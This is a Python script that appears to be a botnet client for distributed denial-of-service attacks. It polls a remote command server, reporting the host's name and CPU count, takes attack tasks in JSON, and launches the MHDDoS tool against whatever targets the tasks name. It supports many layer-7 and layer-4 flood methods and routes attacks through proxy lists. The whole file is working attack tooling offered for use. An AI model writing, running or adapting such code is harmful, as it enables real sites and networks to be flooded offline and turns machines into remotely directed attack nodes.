#!/usr/bin/env python3

import json
import psutil
import subprocess
import sys

from collections import namedtuple
from logging import basicConfig, getLogger
from pathlib import Path
from queue import Queue
from socket import gethostname
from sys import argv
from threading import Thread
from time import sleep
from urllib.request import urlopen

import MHDDoS.start as MHDDoS

from proxies import update_file

getLogger('proxies').setLevel("CRITICAL")

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")

logger = getLogger("Bot Runner")
logger.setLevel("INFO")

url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"

loop_time = 60
RETRY_PERIOD_SEC = 30


class Worker(Thread):
    """Thread executing tasks from a given tasks queue"""

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            finally:
                self.tasks.task_done()


class ThreadPool:
    """Pool of threads consuming tasks from a queue"""

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """Add a task to the queue"""
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        """Wait for completion of all the tasks in the queue"""
        self.tasks.join()


l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def customDecoder(Obj):
    return namedtuple('X', Obj.keys())(*Obj.values())


def runner(config):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(config.Threads if thread_limit <= 0 else thread_limit),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads if thread_limit <= 0 else thread_limit),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads if thread_limit <= 0 else thread_limit),
                str(period)
            ]
        else:
            logger.info(
                'No we cant run the LEVEL7 attacks without proxy. Skipping')
    try:
        cpu_usage = psutil.cpu_percent(4)
        while cpu_usage > cpu_limit:
            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
            sleep(loop_time)
            cpu_usage = psutil.cpu_percent(4)
        subprocess.run([sys.executable, "MHDDoS/start.py", *params])
        logger.info("The system works good! Thanks :P ")
    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.info(f"OOPS... {config.Dst} -> Issue: {error}")


if __name__ == '__main__':

    pool_size = int(argv[1]) if len(argv) >= 2 else int(psutil.cpu_count() / 2)
    thread_limit = int(argv[2]) if len(argv) >= 3 else 0
    cpu_limit = int(argv[3]) if len(argv) >= 4 else 70

    logger.info('''
  ____      _               ____                         _   _   _   _    
 / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
| |  | | | | '_ \ / _ \ '__\___ \| '_ \ / _` |/ __/ _ \ | | | | | |/ _ \  
| |__| |_| | |_) |  __/ |   ___) | |_) | (_| | (_|  __/ | | | |_| / ___ \ 
 \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
      |___/                      |_|                    |_|               
''')

    logger.info(f"Task server {url}")

    try:
        pool = ThreadPool(pool_size)

        logger.info("Get fresh proxies. Please wait...")
        update_file()

        #MHDDoS.threads = 10
        #proxy_config = json.load(open("MHDDoS/config.json"))
        #MHDDoS.handleProxyList(proxy_config, Path(
        #    "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)

        while True:

            logger.info("Getting fresh tasks from the server!")
            try:
                for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
                    pool.add_task(runner, conf)
                    sleep(loop_time / 4)
                pool.wait_completion()

            except Exception as error:
                logger.critical(f"OOPS... We faced an issue: {error}")
                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                sleep(RETRY_PERIOD_SEC)

    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.critical(f"OOPS... We faced an issue: {error}")
        logger.info("Please restart the tool! Thanks")
